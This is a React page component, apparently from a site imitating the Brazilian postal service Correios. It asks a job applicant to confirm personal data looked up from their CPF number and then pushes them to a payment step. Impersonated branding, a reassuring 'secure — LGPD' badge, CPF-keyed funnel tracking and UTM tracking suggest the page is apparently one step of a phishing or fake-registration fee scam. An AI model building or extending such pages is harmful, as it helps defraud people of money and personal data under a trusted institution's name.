import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import CorreiosCard from "@/components/CorreiosCard";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const ConfirmaDados = () => {
  const navigate = useNavigate();
  const location = useLocation();

  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const cepData = location.state?.cepData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    saveSession({ cpfData, currentStep: "/confirma-dados" });
    trackFunnelEvent('confirma-dados', { cpf: cpfData.cpf });
    window.scrollTo(0, 0);
  }, [cpfData, navigate]);

  const handleConfirmar = () => {
    navigate(buildUrlWithUtm("/detalhes-inscricao"), {
      state: { cpfData, cepData },
    });
  };

  const handleCorrigir = () => {
    clearSession();
    navigate("/");
  };

  if (!cpfData) return null;

  const dataFields = [
    { label: "Nome completo", value: cpfData.nome },
    { label: "Data de nascimento", value: cpfData.dataNascimento },
    { label: "Nome da mãe", value: cpfData.nomeMae },
    { label: "CPF", value: cpfData.cpf },
    { label: "Sexo", value: cpfData.sexo },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente de Correios > Inscrição > Confirmação" />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <CorreiosCard className="w-full max-w-lg">
          <div className="space-y-5">
            <div className="text-center space-y-1">
              <h1 className="text-lg sm:text-xl font-bold text-foreground">
                Confirme seus dados
              </h1>
              <p className="text-sm text-muted-foreground">
                Verifique se as informações do candidato estão corretas
              </p>
            </div>

            <div className="border border-border rounded-lg divide-y divide-border overflow-hidden">
              {dataFields.map((field, index) => (
                <div key={index} className="p-3 text-center bg-card hover:bg-muted/30 transition-colors">
                  <p className="text-xs text-muted-foreground font-medium">{field.label}</p>
                  <p className="font-bold text-foreground mt-0.5 text-sm">{field.value}</p>
                </div>
              ))}
            </div>

            <div className="space-y-3">
              <Button
                onClick={handleConfirmar}
                className="w-full h-12 text-sm font-bold"
              >
                Confirmar e prosseguir para pagamento
              </Button>
              <Button
                onClick={handleCorrigir}
                variant="outline"
                className="w-full h-10 text-sm font-semibold"
              >
                Não sou eu, corrigir dados
              </Button>
            </div>

            <div className="flex items-center justify-center gap-2 text-muted-foreground pt-1">
              <Shield className="w-3.5 h-3.5" />
              <span className="text-[10px]">Dados consultados de forma segura — LGPD</span>
            </div>
          </div>
        </CorreiosCard>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default ConfirmaDados;
